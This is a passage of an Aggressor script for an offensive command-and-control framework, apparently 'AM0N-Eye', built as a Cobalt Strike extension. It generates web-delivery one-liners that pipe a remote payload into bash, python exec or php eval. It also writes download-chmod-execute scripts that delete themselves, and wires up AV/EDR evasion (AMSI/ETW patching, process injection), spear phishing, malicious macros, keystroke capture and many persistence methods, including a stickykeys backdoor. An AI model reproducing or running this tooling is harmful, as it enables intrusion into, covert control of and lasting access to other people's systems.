    } else {
        $beaconUrl = site_host($host, $lport, "/".$targetSaveName, $c2Data, "automatic", $listener_name.'[http]', false);
    }
    elog("create listener: ".$listener_name);
    show_message("create listener: ".$listener_name);
}

sub createC2ServerListener {
    local('$reverse_https_flag');
    local('$output_file');
    $reverse_https_flag = $1;
    $output_file = "/tmp/C2Server-test";
    if (getSystemInfo() == 1) {
        $output_file = "/tmp/t_cc2.out";
    } else { 
        $output_file = "t_cc2.out";
    }
    $dialog = dialog("C2 Server Listener", %(lport => "55413", beaconKey => "./.AM0N.beacon_keys", rebind_lib => "null", config_ini => "null", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => $output_file, enableSSL => false, bindPort => "4444", cs_version => "4.3"), &createC2ServerListenerDialogCallBack);

    drow_text($dialog, "lport", "host beacon port: ", 20);
    drow_file($dialog, "beaconKey", "Choose: default ./.AM0N.beacon_keys");
    if ($reverse_https_flag) {
        drow_file($dialog, "rebind_lib", "Choose: rebind_dynamic_lib");
        drow_file($dialog, "config_ini", "Choose: config_ini");
        drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS"));
    } else {
        drow_combobox($dialog, "system", "System: ", @("Linux-bind", "MacOS-bind"));
    }
    if ($reverse_https_flag) {
        drow_listener($dialog, "listener", "Listener: (reverse_https)");
    } else {
        drow_text($dialog, "bindPort", "C2 Server bind TCP Listener Port: ");
    }
    drow_combobox($dialog, "arch", "Arch: ", @("x64", "x86"));
    drow_combobox($dialog, "payload_type", "Payload_Type: ", @("Stageless", "Staged"));
    drow_text($dialog, "outputFileName", "OutputFileName: ");
    if ($reverse_https_flag) {
        drow_checkbox($dialog, "enableSSL", "SSL: ", "Enable SSL");
    }
    drow_combobox($dialog, "cs_version", "CS Version: ", @("<= 4.4", "4.4 - source version"));
    dbutton_action($dialog, "Build");
    dialog_show($dialog);
}

sub projectAboutCallback {
    $autoupdate = "java -jar " . $CC2_PATH . "autoupdate.jar";
    exec($autoupdate);
}



sub genDownloadPayload {
    # "python", "ruby", "pip", "php", "ksh"
    local('$type $payloadContentURL $downloadURL');
    $type = $1;
    $payloadContentURL = $2;
    $enableSSL = $3;
    $downloadURL = "";
    if ($type eq "curl") {
        $bypassSSL = "";
        if ($enableSSL eq 'true') {
            $bypassSSL = "-k";
        }
        $downloadURL = "curl -A O ".$bypassSSL." -o- -L ".$payloadContentURL." | bash -s";
    } else if ($type eq "wget") {
        $bypassSSL = "";
        if ($enableSSL eq 'true') {
            $bypassSSL = "--no-check-certificate";
        }
        $downloadURL = "wget -U O ".$bypassSSL." -O - ".$payloadContentURL." | bash -s";
    } else if ($type eq "python") {
        $downloadURL = "python -c \"import urllib2; exec urllib2.urlopen('".$payloadContentURL."').read()\"";
    } else if ($type eq "php") {
        $downloadURL = "php -r \"eval(file_get_contents('".$payloadContentURL."'));\"";
    } else if ($type eq "ksh") {

    } else if ($type eq "python2") {

    } else if ($type eq "python3") {

    } else if ($type eq "js") {
        
    }
    return $downloadURL;
}

sub genDownloadPayloadContent {
    local('$type $beaconUrl $payload $processName $targetSaveDir $targetSaveName $targetSavePath $type $payload');
    $type = $1;
    $beaconUrl = $2;
    $payload = "";
    $processName = $3;
    $enableSSL = $4;
    $autoDelete = $5;

    $targetSaveDir = random_string(5);
    $targetSaveDir = '.'.$targetSaveDir.'';
    $targetSaveName = $processName;
    $targetSavePath = "/tmp/".$targetSaveDir."/".$targetSaveName;

    if ($type eq "curl") {
        $payload = "mkdir /tmp/".$targetSaveDir.";";
        $payload = $payload." rm -f ".$targetSavePath.";";
        $bypassSSL = "";
        if ($enableSSL eq 'true') {
            $bypassSSL = "-k";
        }
        $payload = $payload." curl -A O ".$bypassSSL." -L ".$beaconUrl." -o ".$targetSavePath.";";
        $payload = $payload." chmod 755 ".$targetSavePath.";";
        $payload = $payload." ".$targetSavePath.";";
        if ($autoDelete eq 'true') {
            $payload = $payload." sleep 10;";
            $payload = $payload." rm -rf ".$targetSavePath;
        }
    } else if ($type eq "wget") {
        $payload = "mkdir /tmp/".$targetSaveDir.";";
        $payload = $payload." rm -f ".$targetSavePath.";";
        $bypassSSL = "";
        if ($enableSSL eq 'true') {
            $bypassSSL = "--no-check-certificate";
        }
        $payload = $payload." wget -U 'O' ".$bypassSSL." ".$beaconUrl." -O ".$targetSavePath.";";
        $payload = $payload." chmod 755 ".$targetSavePath.";";
        $payload = $payload." ".$targetSavePath.";";
        if ($autoDelete eq 'true') {
            $payload = $payload." sleep 10;";
            $payload = $payload." rm -rf ".$targetSavePath;
        }
    } else if ($type eq "python") {
        $payload = "import sys\nimport os\nimport time\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\n";
        $payload = $payload."os.system('mkdir /tmp/".$targetSaveDir."; rm -f ".$targetSavePath."')\n";
        $payload = $payload."r.urlretrieve('".$beaconUrl."', '".$targetSavePath."')\n";
        $payload = $payload."os.system('chmod 755 ".$targetSavePath."')\n";
        $payload = $payload."os.system('".$targetSavePath."')\n";
        if ($autoDelete eq 'true') {
            $payload = $payload."time.sleep(10)\n";
            $payload = $payload."os.system('rm -f ".$targetSavePath."')\n";
        }
    } else if ($type eq "php") {
        $payload = "system('mkdir /tmp/".$targetSaveDir."; rm -f ".$targetSavePath."');";
        $payload = $payload."\$c=file_get_contents('".$beaconUrl."');file_put_contents('".$targetSavePath."', \$c);";
        $payload = $payload."system('chmod 755 ".$targetSavePath."');";
        $payload = $payload."system('".$targetSavePath."');";
        if ($autoDelete eq 'true') {
            $payload = $payload."sleep(10);";
            $payload = $payload."system('rm -f ".$targetSavePath."');";
        }
    } else if ($type eq "python2") {

    } else if ($type eq "python3") {

    } else if ($type eq "js") {

    }
    return $payload;
}

sub checkC2ServerBeaconSite {
    local('$beacon_site_name $beaconURLMap $matchFlag');
    $beacon_site_name = $1;
    $matchFlag = "";
    %beaconURLMap = getC2ServerSite();
    foreach $key => $value (%beaconURLMap) {
        if ($beacon_site_name isin $value) {
            $matchFlag = $value[1];
        }
    }
    return $matchFlag;
}

sub getC2ServerBeaconSiteURL {
    local('$listener_name $beacon_site_name $listener $listener_padding $system_arch_padding $listener_name $system $arch');
    $listener_name = $1;
    $beacon_site_name = "";
    $listener = $null;
    if ("C2Server reverse HTTPS" isin $listener_name) {
        $beacon_site_name = "C2Server beacon: reverse-https";
        ($_, $listener_padding, $system_arch_padding) = split('\{ ', $listener_name);
        ($listener, $_) = split(' \}', $listener_padding);
        ($system, $arch, $_) = split(' ', $system_arch_padding);
    } else {
        $beacon_site_name = "C2Server beacon: bind-tcp";
        ($_, $_, $_, $_, $system, $arch) = split(' ', $listener_name);
    }
    $beacon_site_name = $beacon_site_name.' '.$system.' '.$arch;
    if ($listener) {
        $beacon_site_name = $beacon_site_name.' { '.$listener.' }'
    }
    return $beacon_site_name;
}

sub createC2ServerBeaconSite {
    local('$listener $beacon_site_name $lhost $lport $enableSSL $beaconData $targetSaveName $beaconUrl');
    $listener = $1;
    $beacon_site_name = $2;
    $lhost = $3;
    $lport = $4;
    $enableSSL = $5;
    $beaconData = listener_info($listener)['C2ServerBeacon'];
    $targetSaveName = random_string(10);
    if ($enableSSL eq 'true') {
        $beaconUrl = site_host($lhost, $lport, "/".$targetSaveName, $beaconData, "automatic", $beacon_site_name.'[https]', true); 
    } else {
        $beaconUrl = site_host($lhost, $lport, "/".$targetSaveName, $beaconData, "automatic", $beacon_site_name.'[http]', false);
    }
    return $beaconUrl;
}

sub genC2ServerScriptDialogCallback {
    local('$uri $lhost $lport $type $enableSSL $processName $listener $needCheckBeaconSiteName $payloadContent $payloadContentURL $scriptUrl');
    $uri = $3['uri'];
    $lhost = $3['lhost'];
    $lport = $3['lport'];
    $type = $3['type'];
    $enableSSL = false;
    $enableSSL = $3['enableSSL'];
    $autoDelete = $3['autoDelete'];
    $processName = $3['processname'];
    $listener = $3['listener'];
    $needCheckBeaconSiteName = getC2ServerBeaconSiteURL($listener);
    $beaconUrl = checkC2ServerBeaconSite($needCheckBeaconSiteName);
    if ($beaconUrl eq "") {
        $beaconUrl = createC2ServerBeaconSite($listener, $needCheckBeaconSiteName, $lhost, $lport, $enableSSL);
    }
    $listenerinfo = @($needCheckBeaconSiteName, $beaconUrl);

    # gen payloadContent
    $payloadContent = genDownloadPayloadContent($type, $beaconUrl, $processName, $enableSSL, $autoDelete);
    # host payloadContent
    if ($enableSSL eq 'true') {
        $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-https) {".$listenerinfo[0]."}", true);
    } else {
        $payloadContentURL = site_host($lhost, $lport, $uri, $payloadContent, "automatic", "Script (".$type."-http) {".$listenerinfo[0]."}", false);
    }
    
    # gen payload
    $scriptUrl = genDownloadPayload($type, $payloadContentURL, $enableSSL);
    # add_to_clipboard($scriptUrl);
    prompt_text("Copy/Paste One-liner: ", $scriptUrl, {});
    elog("");
    elog("C2Server $type script: " . $scriptUrl);
}

sub getC2ServerSite {
    local('%beacon_site $beacon_count $Description, $Proto, $Host, $Port, $URI');
    %beacon_site = %();
    $beacon_count = 0;
    foreach $site_list(sites()) {
        ($Description, $Proto, $Host, $Port, $URI) = values($site_list, @('Description', 'Proto', 'Host', 'Port', 'URI'));
        if ("C2Server" isin $Description) {
            $beaconURL = $Proto.$Host.':'.$Port.$URI;
            # 返回beacon_uri & beacon_description
            %beacon_site[$beacon_count] = @($Description, $beaconURL);
            $beacon_count += 1;
        }
    }
    return %beacon_site;
}

sub getC2ServerListener {
    local('%beacon_listener $beacon_count');
    %beacon_listener = %();
    $beacon_count = 0;
    foreach $listener(listeners_local()) {
        if ("C2Server" isin $listener) {
            %beacon_listener[$beacon_count] = @($listener);
            $beacon_count += 1;
        }
    }
    return %beacon_listener;
}

sub createC2ServerScript {
    local('@beaconSiteMenu @beaconListenerMenu %beaconListenerMap');
    @beaconSiteMenu = @();
    @beaconListenerMenu = @();

    %beaconListenerMap = getC2ServerListener();
    foreach $key => $value (%beaconListenerMap) {
        add(@beaconListenerMenu, $value[0]);
    }

    $dialog = dialog("C2 Web Delivery", %(uri => "/a", processname => "update", lhost => localip(), lport => "55413", type => "curl", listener => "", enableSSL => false, autoDelete => false), &genC2ServerScriptDialogCallback);

    drow_text($dialog, "uri", "URI Path: ", 20);
    drow_text($dialog, "processname", "ProcessName: ", 20);
    drow_text($dialog, "lhost", "Local Host:", 20);
    drow_text($dialog, "lport", "Web Delivery Port: ", 20);
    drow_combobox($dialog, "type", "Type: ", @("curl", "wget", "python", "php"));
    drow_combobox($dialog, "listener", "C2 Server Listener: ", @beaconListenerMenu);
    drow_checkbox($dialog, "enableSSL", "SSL: ", "Enable SSL");
    drow_checkbox($dialog, "autoDelete", "autoDelete: ", "auto delete");
    dbutton_action($dialog, "Build");
    dialog_show($dialog);
}


# Please do not use / at the end of the directories!
############################################################
#Path to the ScareCrow-AM0N framework repository you just cloned.

#Path to the compiled ScareCrow Go executable of the installation.

############################################################




#menubar("EDR evasion", "scare_crow");

popup scare_crow {
    item "&EDR evasion" {
        ScareCrow();

    }
    item "EDR Query" {
		query($1);
	}
}

sub ScareCrow {
    local('$dialog %defaults');
    %defaults["domain"] = "www.microsoft.com";

    $dialog = dialog("AV/EDR evasion", %defaults, &mainCallback);
    dialog_description($dialog, "EDR unhooking, Syscall loading, ETW/AMSI patch, Process Injection, Signed Loader, AES encrypt");
    drow_listener_stage($dialog, "listener", "(1) Listener: ");
    drow_file($dialog, "custom_binary", "(2) Custom x64 Shellcode: ");
    drow_combobox($dialog, "payload_type", "(3) Payload Type: ", @("Stageless"));
    drow_combobox($dialog, "architecture", "(4) Architecture: ", @("x64"));
    drow_combobox($dialog, "loader", "(5) Loader: ", @("binary", "control", "dll", "excel", "msiexec", "wscript"));
    drow_checkbox($dialog, "noamsi", "(6) Disable AMSI patching (enabled by default)");
    drow_checkbox($dialog, "noetw", "(7) Disable ETW patching (enabled by default)");
    drow_checkbox($dialog, "nosleep", "(8) Disable the sleep delay");
    drow_checkbox($dialog, "sandbox", "(9) Sandbox evasion");
    drow_text($dialog, "injection", "(10) Process Injection: ");
    drow_text($dialog, "domain", "(11) Domain (Change if using it against Windows systems): ");
    dbutton_action($dialog, "Generate Payload");

    dialog_show($dialog);
}

sub loaderDialog {
    local('$dialog %defaults');

    $dialog = dialog("Payload Generator (S)", %defaults, &loaderDialogCallback);
    dialog_description($dialog, "Specify loader name for the payload e.g. Loader.js or Loader.hta - (**Optional For Control payloads)");
    drow_text($dialog, "loader_name", "Loader name: ");
    dbutton_action($dialog, "Generate");

    dialog_show($dialog);
}

sub loaderDialogCallback {
    $loader_name = $3["loader_name"];
    GeneratePayload();
}

sub mainCallback {
    if ($3["listener"] eq "") {
        show_message("Please specify a listener!");
        exit();
    }

    $loader = $3["loader"];
    $domain = $3["domain"];
    $noamsi = $3["noamsi"];
    $noetw = $3["noetw"];
    $nosleep = $3["nosleep"];
    $sandbox = $3["sandbox"];
    $custom_bin = $3["custom_binary"];
    $injection = $3["injection"];

    if ($injection ne "" && $noetw eq "false"){
        show_message("Cannot use Process Injection and ETW patching together. Disable ETW patching if you want to do a Process Injection");
        exit();
    }

    if ($custom_bin ne ""){   
        $shellcode_file = openf($custom_bin);
        $shellcode = readb($shellcode_file, -1);
        closef($shellcode_file);
    }else{
        $shellcode = artifact_payload($3["listener"], "raw", $3["architecture"]);
    }

    if ($loader eq "binary"){
        GeneratePayload();
    } else if ($loader eq "dll"){
        GeneratePayload();
    }else if ($loader eq "control"){
        loaderDialog();
    }else if ($loader eq "excel"){
        loaderDialog();
    }else if ($loader eq "msiexec"){
        loaderDialog();
    }else if ($loader eq "wscript"){
        loaderDialog();
    }
}

sub GeneratePayload {
    prompt_file_save("scbeacon.bin", {
        show_message("Generating payload, please wait... You can close this dialog while you wait.");

        $handle = openf(">" . $1);
        writeb($handle, $shellcode);
        closef($handle);

        $arguments = '{';
        $arguments = $arguments . '"scarecrow_executable":' . '"' . $scarecrow_executable . '"' . ',';
        $arguments = $arguments . '"payload":' . '"' . $1 . '"' . ',';
        $arguments = $arguments . '"loader":' . '"' . $loader . '"' . ',';
        $arguments = $arguments . '"domain":' . '"' . $domain . '"' . ',';
        $arguments = $arguments . '"noamsi":' . '"' . $noamsi . '"' . ',';
        $arguments = $arguments . '"noetw":' . '"' . $noetw . '"' . ',';
        $arguments = $arguments . '"nosleep":' . '"' . $nosleep . '"' . ',';
        $arguments = $arguments . '"sandbox":' . '"' . $sandbox . '"' . ',';
        $arguments = $arguments . '"injection":' . '"' . $injection . '"' . ',';
        $arguments = $arguments . '"loader_name":' . '"' . $loader_name . '"' . ',';
        $arguments = $arguments . '"script_path":' . '"' . $script_path . '"';
        $arguments = $arguments . '}';

        $data = exec("python3 " . $script_path . "/Helper.py" . " " . $arguments);

        $helper_response = readAll($data);

        show_message($helper_response); 
    });  
}

popup attacks {
        separator();
	separator();        
item("1. Add Exploitation Listeners", { $dialog = dialog("AM0N-Eye New Exploitation Listeners", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &Staged_Output);
	dialog_description($dialog, "This package generates a new exploitation listeners & beacons");
	drow_listener_smb($dialog, "listener", "Add-Listener: ");
    	dialog_show($dialog);
     });
	        	menu "2. PsExec/Winrm/SSh" {
		# add our exploits
		local('$exploit @x');
		@x = concat(@("ssh", "ssh-key"), beacon_remote_exploits());
		foreach $exploit (sorta(@x)) {
			item($exploit, lambda({ 
				openJumpDialog($exploit, $1);  
			}, \$exploit));
		}
	}

	        menu "3. Payload Generator" {
                               
                	        menu "Executables" {
                item "&Staged Payloads" {
                        payloadgeneratestaged();
                }
                item "&Stageless Payloads" {
                        payloadgeneratestageless();
                }        
                }
                } 
	separator();
	separator();
	menu "4. C2 Server" {
	menu "&Linux & MacOS" {
        item "&Create reverse HTTPS Listener" {
            createC2ServerListener(true);
        }

         item "&Create bind TCP Listener" {
            createC2ServerListener(false);
        }
         item "&C2 Web Delivery" {
        createC2ServerScript();
    } 
    }
    item "Windows" {


	show_message("1. go to Redteam-Ops -> Exploitation Listeners, press Add, and choose External C2 as your payload .
	
 2. Example Third-party ClientThis example client connects to the third-party C2 server directly
     To build this on kali liunx  i686-w64-mingw32-gcc JicopH00k.c -o JicopH00k.exe -lws2_32 .
 
 3. Don't forget to Check C2 profiles in /AM0N-Eye/C2-Profiles/ to bypass network filters
     To use a custom profile  you must start a AM0N-Eye team server and specify your profile at that tim 
     Example ./teamserver [external IP] [password] [/path/to/my.profile] .");

		
	}

    }
   


   
 item "5. Checkmate request" {
		local('$dialog %defaults');

		# setup our defaults
		%defaults["uri"]  = "/dll.txt";
		%defaults["host"] = localip();
		%defaults["port"] = 80;

		# create our dialog
		$dialog = dialog("checkmate request", %defaults, &stage_attack);
		dialog_description($dialog, "version of the checkmate request Web Delivery attack.");
		drow_text($dialog, "uri", "URI Path: ", 20);
		drow_text($dialog, "host", "Local Host: ");
		drow_text($dialog, "port", "Local Port: ");
		drow_listener_stage($dialog, "listener", "Listener: ");
		drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
		dbutton_action($dialog, "Launch");

		# show our dialog
		dialog_show($dialog);
	}      
       
       separator();
	separator();
       
    	

	item "6. AV/EDR Evasion" {
        ScareCrow();
        }
        
        item "7. Shellcode Obfuscatior" { generate_shellcode();

		
		}
        
        
 menu "8. Pivoting" {
 	item("Proxy Pivots", { openSOCKSBrowser(); });
	item("VPN Interfaces", { openInterfaceManager(); });
	item("Deploy VPN client", { openCovertVPNSetup(); });       


	}
        
        
        

menu "9. Privilege Escalation" {

item "One-liner" {
                        openOneLinerDialog($1);
                }


item "CVE-Elevate" {


		        show_message("Go to Beacon -> Privilege Escalation -> Elevate
Attempt to execute a listener in an elevated context
Or take exploitation of the privilege escalation CVE");

		
	}

	}
	menu "10. I-Malicious" {
        item("Macro", { openOfficeMacroDialog(); });
        item("Host File", { openHostFileDialog(); });
	menu "Url" {
                item("Smart Applet", { openJavaSmartAppletDialog(); });
		item("Signed Applet", { openJavaSignedAppletDialog(); });
		}
        item("HTML", { openHTMLApplicationDialog(); });
        item("Autoruns", { openAutoRunDialog(); });
        item("Script Line", { openScriptedWebDialog(); });
	}
	separator();
	separator();
	item("11. System Profiler", { openSystemProfilerDialog(); });
        item("12. Clone Hook", { openCloneSiteDialog(); });        
	item("13. Spear phishing", { openSpearPhishDialog(); });
        separator();
	separator();
 menu "14. Reporting" {
# pull a list of registered reports and make menus for each
	local('$index $report');
	foreach $index => $report (reports()) {
		item("& $+ $index $+ . $report", lambda({
			openReportDialog($report);
		}, \$report)); }
	
	   
	}   
         
			separator();
			separator();
}

popup Server {
	        item("1. Applications", { openApplicationManager(); });
		item("2. Credentials", { openCredentialManager(); });
		item("3. Listener Manager", { openListenerManager (); });
		item "4. Services" { openServiceBrowser($1); }
		item("5. Script Manager", { openScriptManager(); });
		item("6. Victims Keystrokes", { openKeystrokeBrowser(); });
		item("7. Manage Web Server", { openSiteManager(); });
		item("8. Screenshots", { openScreenshotBrowser(); });
		item("9. Downloads", { openDownloadBrowser(); });
		item("10. View Logs", { openEventLog(); });
		item("11. Web Logs", { openWebLog(); });
}




popup reporting {

	# pull a list of registered reports and make menus for each
	local('$index $report');
	foreach $index => $report (reports()) {
		item("& $+ $index $+ . $report", lambda({
			openReportDialog($report);
		}, \$report));
	}
	   menu "5. Scripting" {
	       	item("Script &Console", { openScriptConsole(); });
	       	item("Script Manager", { openScriptManager(); });
	       	
	       	} 
	
	item("9. Cover Me", { openInterfaceManager(); });
}



popup beacon {
menu "&Persistence Threat" {
			item "&Schtasks Persistence" {
				local('$bid');
				foreach $bid ($1) {
					persistUserSchtasks($bid);
				}
			}
			

			
			item "&Service EXE Persistence" {
				local('$bid');
				foreach $bid ($1) {
					if (-isadmin $bid) {
						persistCustomService($bid);
					}
					else {
						berror($1, "\c4Persistence Requires Admin Level Privileges");
					}
				}
			}
			item "&Registry Persistence" {
				local('$bid');
				foreach $bid ($1) {
					persistRegistry($bid);
				}
			}
			item "&HKCU Run Key Registry PowerShell Persistence" {
				local('$bid');
				foreach $bid ($1) {
					persistRegistryHKCU($bid);
				}
			}
			item "&HKLM Run Key Registry PowerShell Persistence" {
				local('$bid');
				foreach $bid ($1) {
					persistRegistryHKLM($bid);
				}
			}
			
			
			item "&WMI Event Persistence using PowerShell" {
				local('$bid');
				foreach $bid ($1) {
					if (-isadmin $bid) {
						persistwmievent($bid);
					}
					else {
						berror($1, "\c4Persistence Requires Admin Level Privileges");
					}	
				}
			}
			item "&WMI Event Persistence using WMIC" {
				local('$bid');
				foreach $bid ($1) {
					if (-isadmin $bid) {
						persistwmieventwmic($bid);
					}
					else {
						berror($1, "\c4Persistence Requires Admin Level Privileges");
					}
				}
			}
			item "&Startup Script Local GPO Persistence" {
				local('$bid');
				foreach $bid ($1) {
					if (-isadmin $bid) {
						persistStartupGPO($bid);
					}
					else {
						berror($1, "\c4Persistence Requires Admin Level Privileges");
					}
				}
			}
			item "&Stickykeys(OSK) BackDoor Persistence (Need RDP Open)" {
				local('$bid');
				foreach $bid ($1) {
					stickykeys($bid);
				}
			}	
			item "&Windows Startup Persistence"{
				local('$bid');
				foreach $bid ($1) {
					persistThroughStartUpFolder($bid);
				}
			
			}
			
					separator();	
			
	menu "Manual Persistence" {
		menu Elevated{
			#item "Elevated: WMI Registry Key"{
				#local('$bid');
				#foreach $bid ($1){
					#wmielevatedregdialog($bid);
				#}
			#}
			item "Elevated: Registry Key"{
				local('$bid');
				foreach $bid ($1){
					&elevatedregistrydialog($bid);
				}
			}
			item "Elevated: UserInit Registry Key"{
				local('$bid');
				foreach $bid ($1){
					&elevateduserinitregistrydialog($bid);
				}
			}
			item "Elevated: Scheduled Task"{
				local('$bid');
				foreach $bid ($1){
					&scheduledtaskdialog($bid);
				}
			}
			item "Elevated: Create Service"{
				local('$bid');
				foreach $bid ($1){
					&servicedialog($bid);
				}			}
			item "Elevated: WMI Event Subscription"{
				local('$bid');
				foreach $bid ($1){
					&wmieventsubdialog($bid);
				}
			}
		}
		menu Non-Elevated {
			item "Non-Elevated: Registry Key"{
				local('$bid');
				foreach $bid ($1){
					&userregistrydialog($bid);
				}
			}
			item "Non-Elevated: Registry UserInitMprLogonScript Key"{
				local('$bid');
				foreach $bid ($1){
					&registryuserinitmprlogondialog($bid);
				}
			}
			item "Non-Elevated: Scheduled Task"{
				local('$bid');
				foreach $bid ($1){
					&scheduledtaskdialog($bid);
				}
			}
			item "Non-Elevated: Scheduled Task COM Handler Hijack"{
				local('$bid');
				foreach $bid ($1){
					&schtskcomhijackdialog($bid);
				}
			}
			item "Non-Elevated: Junction Folder"{
				local('$bid');
				foreach $bid ($1){
					&junctionfolderdialog($bid);
				}
			}
		}
		menu Misc{
			item "Misc: Add Action to Scheduled Task"{
				local('$bid');
				foreach $bid ($1){
					&addactionschtaskdialog($bid);
				}
			}
			item "Misc: Replace Binary/File"{
				local('$bid');
				foreach $bid ($1){
					&replacefiledialog($bid);
				}
			}
			item "Misc: Startup Folder"{
				local('$bid');
				foreach $bid ($1){
					&startupfolderdialog($bid);
				}
			}
			item "Misc: New LNK"{
				local('$bid');
				foreach $bid ($1){
					&newlnkdialog($bid);
				}
			}
			item "Misc: Backdoor LNK"{
				local('$bid');
				foreach $bid ($1){
					&backdoorlnkdialog($bid);
				}
			}
			item "Misc: Get Running Services"{
				local('$bid');
				foreach $bid ($1){
					binput($bid, "StayKit get running services");
					blog2($bid, "" . dstamp(ticks()) . " - Showing running services via SharpStay");
					bexecute_assembly!($bid, $sharppersist, "action=listrunningservices");
				}
			}
			item "Misc: Get Scheduled Tasks"{
				local('$bid');
				foreach $bid ($1){
					binput($bid, "StayKit get scheduled tasks");
					blog2($bid, "" . dstamp(ticks()) . " - Showing scheduled tasks via SharpStay");
					bexecute_assembly!($bid, $sharppersist, "action=listtasknames");
				}
			}
			item "Misc: Get Scheduled Task ComHandler"{
				local('$bid');
				foreach $bid ($1){
					binput($bid, "StayKit get scheduled tasks com handlers");
					blog2($bid, "" . dstamp(ticks()) . " - Showing Scheduled tasks with COM handlers via SharpStay");
					bexecute_assembly!($bid, $sharppersist, "action=GetScheduledTaskComHandler");
				}
			}
		}
		item "Set/Update Defaults"{
			&updateglobals();
		}
	}
}

$sharppersist = script_resource("SharpStay.exe");
# For quick persistence - Global vars
%persistdefaults["regkeyname"] = "WinReg";
%persistdefaults["taskname"] = "WinTask";
%persistdefaults["servicename"] = "WinSvc";
%persistdefaults["eventname"] = "WinEvent";
%persistdefaults["attime"] = "startup";
%persistdefaults["lnkpath"] = "";
%persistdefaults["command"] = "";
%persistdefaults["droplocation"] = "C:\\Windows\\Temp\\Stay.exe";
%persistdefaults["clsid"] = "";
%persistdefaults["dllpath"] = "";

#Payload defaults
%persistdefaults["customfile"] = "";
%persistdefaults["listener"] = "";
%persistdefaults["template"] = "";
%persistdefaults["staged"] = "false";
%persistdefaults["x86"] = "false";
%persistdefaults["findreplace"] = "\$\$PAYLOAD\$\$";
%persistdefaults["shellcodeformat"] = "base64";
#%persistdefaults[""] = "";

sub updateglobals{
	local('$dialog');
	$dialog = dialog("Global variables", %persistdefaults, &saveoptions);
	dialog_description($dialog, "Global variables");
	drow_text($dialog, "regkeyname", "Registry Key Name: ");
	drow_text($dialog, "taskname", "Task Name: ");
	drow_text($dialog, "servicename", "Service Name");
	drow_text($dialog, "eventname", "Event Name");
	drow_text($dialog, "command", "Command: ");
	drow_text($dialog, "clsid", "ClassID: ");
	drow_text($dialog, "dllpath", "DLL Path: ");
	drow_text($dialog, "droplocation", "Drop Location: ");
	drow_file($dialog, "customfile", "Custom File: ");
	drow_listener_stage($dialog, "listener", "Listener: ");
	drow_file($dialog, "template", "Payload Template: ");
	drow_combobox($dialog, "shellcodeformat", "Shellcode Format: ", @("raw", "base64", "array", "hex", "powershell-base64", "vba", "vbs", "veil"));
	drow_text($dialog, "findreplace", "Find Replace String: ");
	drow_checkbox($dialog, "staged", "Staged Payloads: ");
	drow_checkbox($dialog, "x86", "x86 Payloads: ");
	dbutton_action($dialog, "Update");
	dialog_show($dialog);
	#drow_text($dialog, "", "");
}

sub saveoptions{
	local('%options');
	%options = $3;
	%persistdefaults["regkeyname"] = %options["regkeyname"];
	%persistdefaults["taskname"] = %options["taskname"];
	%persistdefaults["servicename"] = %options["servicename"];
	%persistdefaults["eventname "] = %options["eventname"];
	%persistdefaults["command"] = %options["command"];
	%persistdefaults["droplocation"] = %options["droplocation"];
	%persistdefaults["customfile"] = %options["customfile"];
	%persistdefaults["clsid"] = %options["clsid"];
	%persistdefaults["dllpath"] = %options["dllpath"];

	%persistdefaults["listener"] = %options["listener"];
	%persistdefaults["template"] = %options["template"];
	%persistdefaults["staged"] = %options["staged"];
	%persistdefaults["x86"] = %options["x86"];
	%persistdefaults["findreplace"] = %options["findreplace"];
	%persistdefaults["shellcodeformat"] = %options["shellcodeformat"];
	
	show_message("Defaults have been saved");
}

sub executepersistence{
	local('$bid $taskargs $inst');
	$bid = $1;
	$taskargs = $3;
	$inst = $4;
	$persisttype = $5;
	binput($bid, "StayKit $inst $persisttype Persistence");
	btask($bid, "" . dstamp(ticks()) . " - $inst $persisttype Persistence via StayKit/SharpStay");
	bexecute_assembly!($bid, $sharppersist, $taskargs);
}

sub compilepl{
	local('$cmpdata $prebuild $cmpledfl $handle4 $buildcpled $handle $sourcepay $refs $archi $platf $saveas $cmplrtest $testres');
	$sourcepay = $1;
	$archi = $2;
	$compiler = "mcs";
	$cmplrtest = exec("which $compiler");
	$testres = readAll($cmplrtest);
	$saveas = script_resource("CompiledFile.exe");
	if($testres eq "@()"){
		show_message("It appears you do not have the right compiler \($compiler\) installed, Mono is required to build this payload");
		exit();
	}

	if($archi eq "x86"){
		$platf = "-platform:x86";
	}
	else if($archi eq "x64"){
		$platf = "-platform:x64";
	}
	$prebuild = script_resource("TempPreCompileFile.cs");
	$handle4 = openf(">$prebuild");
	writeb($handle4, $sourcepay);
	closef($handle4);

	$buildcpled = exec("mcs $platf $refs -out:$saveas $prebuild");
	@datax = readAll($buildcpled);
	closef($buildcpled);
	sleep(2000);

	$cmpledfl = openf($saveas);
	$cmpdata = readb($cmpledfl, -1);
	closef($cmpledfl);

	deleteFile($saveas);
	deleteFile($prebuild);
	return $cmpdata;
}

sub payloadhandler{
	local('$bid $gen $arguments $droplo $plarch');
	$bid = $1;
	$gen = $2;
	$arguments = $3;
	$droplo = $4;
	if(%persistdefaults["x86"] eq "false"){
		$plarch = "x64";
	}
	else{
		$plarch = "x86";
	}
	if ($gen["customfile"] ne ""){
		$handle = openf($gen["customfile"]);
		$data = readb($handle, -1);
		closef($handle);
		blog2($bid, "" . dstamp(ticks()) . " - StayKit is writing $gen['customfile'] to $droplo")
		bupload_raw!($bid, $droplo, $data);
	}
	else{
		#Build your payload
		if($gen['staged'] eq "false"){
			$shcode = artifact_payload($gen['listener'], "raw", $plarch);
			if(%persistdefaults["shellcodeformat"] eq "raw"){
				$finshellc = $shcode;
			}
			else if(%persistdefaults["shellcodeformat"] eq "base64"){
				$finshellc = base64_encode($shcode);
			}
			else{
				$finshellc = transform($shcode, %persistdefaults["shellcodeformat"])
			}
		}
		else{
			$shcode = stager($gen['listener'], $plarch);
			if(%persistdefaults["shellcodeformat"] eq "raw"){
				$finshellc = $shcode;
			}
			else if(%persistdefaults["shellcodeformat"] eq "base64"){
				$finshellc = base64_encode($shcode);
			}
			else{
				$finshellc = transform($shcode, %persistdefaults["shellcodeformat"])
			}
		}
		$outpl = openf($gen["template"]);
		$data = readb($outpl, -1);
		closef($outpl);
		$noncompiled = strrep($data, %persistdefaults["findreplace"], $finshellc);
		if($gen['droplocation'] ismatch '.*\.exe$'){
